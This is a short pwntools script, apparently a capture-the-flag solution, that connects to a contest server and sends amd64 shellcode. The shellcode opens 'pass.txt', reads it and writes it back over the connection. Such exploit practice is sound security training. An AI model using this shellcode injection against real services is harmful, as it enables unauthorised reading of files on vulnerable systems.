from pwn import *
context(arch='amd64', os='linux')

p = remote('ctf.tcp1p.com', 8008)
#p = process('./chall')
#p = gdb.debug('./chall', '''
#b *main+193''')


file_name = 'pass.txt'
length = 32

shellcode = asm(
	shellcraft.open(file_name) +
	shellcraft.read('rax', 'rsp', length) +
	shellcraft.write(1, 'rsp', length))

p.recvuntil("me? \n")
p.sendline(shellcode)
print(p.recv())
